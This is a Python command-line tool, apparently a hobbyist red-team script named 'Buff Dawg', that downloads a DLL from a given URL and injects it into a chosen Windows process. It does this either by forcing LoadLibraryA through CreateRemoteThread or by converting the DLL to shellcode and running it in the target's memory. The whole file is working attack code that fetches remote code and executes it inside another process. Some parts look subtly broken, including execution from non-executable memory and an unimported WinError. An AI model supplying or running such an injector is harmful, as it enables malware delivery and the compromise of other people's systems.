#!/usr/bin/python
import urllib.request
import ctypes
import argparse
import time
from ctypes import wintypes
from pyfiglet import Figlet
from ShellcodeRDI import *

kernel32 = ctypes.windll.kernel32

LPCTSTR = ctypes.c_char_p 
SIZE_T = ctypes.c_size_t

OpenProcess = kernel32.OpenProcess
OpenProcess.argtypes = (ctypes.wintypes.DWORD, ctypes.wintypes.BOOL, ctypes.wintypes.DWORD)
OpenProcess.restype = ctypes.wintypes.HANDLE

VirtualAllocEx = kernel32.VirtualAllocEx
VirtualAllocEx.argtypes = (ctypes.wintypes.HANDLE, ctypes.wintypes.LPVOID, SIZE_T, ctypes.wintypes.DWORD, ctypes.wintypes.DWORD)
VirtualAllocEx.restype = ctypes.wintypes.LPVOID

WriteProcessMemory = kernel32.WriteProcessMemory
WriteProcessMemory.argtypes = (ctypes.wintypes.HANDLE, ctypes.wintypes.LPVOID, ctypes.wintypes.LPCVOID, SIZE_T, ctypes.POINTER(SIZE_T))
WriteProcessMemory.restype = ctypes.wintypes.BOOL

GetModuleHandle = kernel32.GetModuleHandleA
GetModuleHandle.argtypes = (LPCTSTR, )
GetModuleHandle.restype = ctypes.wintypes.HANDLE

GetProcAddress = kernel32.GetProcAddress
GetProcAddress.argtypes = (ctypes.wintypes.HANDLE, LPCTSTR)
GetProcAddress.restype = ctypes.wintypes.LPVOID

class _SECURITY_ATTRIBUTES(ctypes.Structure):
    _fields_ = [('nLength', ctypes.wintypes.DWORD),
                ('lpSecurityDescriptor', ctypes.wintypes.LPVOID),
                ('bInheritHandle', ctypes.wintypes.BOOL)]

SECURITY_ATTRIBUTES = _SECURITY_ATTRIBUTES
LPSECURITY_ATTRIBUTES = ctypes.POINTER(_SECURITY_ATTRIBUTES)
LPTHREAD_START_ROUTINE = ctypes.wintypes.LPVOID


CreateRemoteThread = kernel32.CreateRemoteThread
CreateRemoteThread.argtypes = (ctypes.wintypes.HANDLE, LPSECURITY_ATTRIBUTES, SIZE_T, LPTHREAD_START_ROUTINE, ctypes.wintypes.LPVOID, ctypes.wintypes.DWORD, ctypes.wintypes.LPDWORD)
CreateRemoteThread.restype = ctypes.wintypes.HANDLE

MEM_COMMIT = 0x0001000
MEM_RESERVE = 0x00002000
PAGE_READWRITE = 0x04
EXECUTE_IMMEDIATELY = 0x0
PROCESS_ALL_ACCESS = (0x000F0000 | 0x00100000 | 0x00000FFF)

def downloader(url, dllname):
    urllib.request.urlretrieve(url, dllname)
    dll = bytes(dllname.encode())
    return dll





def method1(pr, dname):
    pid = pr
    dllname = dname
    handle = OpenProcess(PROCESS_ALL_ACCESS, False, pid)
    print("[+] Obtaining handle...")
    time.sleep(2)

    if not handle:
        raise WinError()
    print("Handle obtained => {0:X}".format(handle))
    time.sleep(1)

    memory = VirtualAllocEx(handle, False, len(dllname) + 1, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE)
    print("[+] Allocating memory in remote process...")
    time.sleep(2)

    if not memory:
        raise WinError()
    print("Memory allocated => ", hex(memory))
    time.sleep(1)

    write = WriteProcessMemory(handle, memory, dllname, len(dllname) + 1, None)
    print("[+] Writing payload into process memory...")
    time.sleep(2)

    if not write:
        raise WinError()
    print("Bytes Written => {}".format(dllname))
    time.sleep(1)

    load_lib = GetProcAddress(GetModuleHandle(b"kernel32.dll"), b"LoadLibraryA")
    print("[+] Executing DLL...")
    time.sleep(2)

    rthread = CreateRemoteThread(handle, None, 0, load_lib, memory, EXECUTE_IMMEDIATELY, None)
    print("[+] Execution completed!")



def method2(url, pid):
    dll = urllib.request.urlopen(url, 'rb').read()
    shellcode = ConvertToShellcode(dll)

    handle = OpenProcess(PROCESS_ALL_ACCESS, False, pid)
    print("[+] Obtaining handle...")
    time.sleep(2)

    memory = VirtualAllocEx(handle, False, len(shellcode) + 1, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE)
    print("[+] Allocating memory in remote process...")
    time.sleep(2)

    write = WriteProcessMemory(handle, memory, shellcode, len(shellcode) + 1, None)
    print("[+] Writing payload into process memory...")
    time.sleep(2)

    print("[+] Execution completed.")

    rthread = CreateRemoteThread(handle, None, 0, memory, None, EXECUTE_IMMEDIATELY, None)





    








if __name__ == "__main__":
    custom_fig = Figlet(font='graffiti')
    print(custom_fig.renderText('Buff Dawg'))
    print("=" * 26)
    print("Buff Dawg DLL Injection")
    print(" Author: Lenard Nguyen ")
    print("=" * 26)

    parser = argparse.ArgumentParser(description="Python DLL Injector")
    parser.add_argument('-u', '--url', type=str, metavar='', required=True, help="URL to DLL file")
    parser.add_argument('-f', '--path', type=str, metavar='', help="Path to save DLL on disk")
    parser.add_argument('-p', '--pid', type=int, metavar='', required=True, help="pid name of process to inject to")
    parser.add_argument('-r', '--memory', action='store_true', help="Convert DLL to shellcode and inject in memory")
    args = parser.parse_args()

    if args.memory:
        method2(args.url, args.pid)
    else:
        if args.path is None:
            parser.error("DLL Injection requires --path / -f option")
        
        str1 = downloader(args.url, args.path)
        str2 = args.pid
        method1(str2, str1)


  


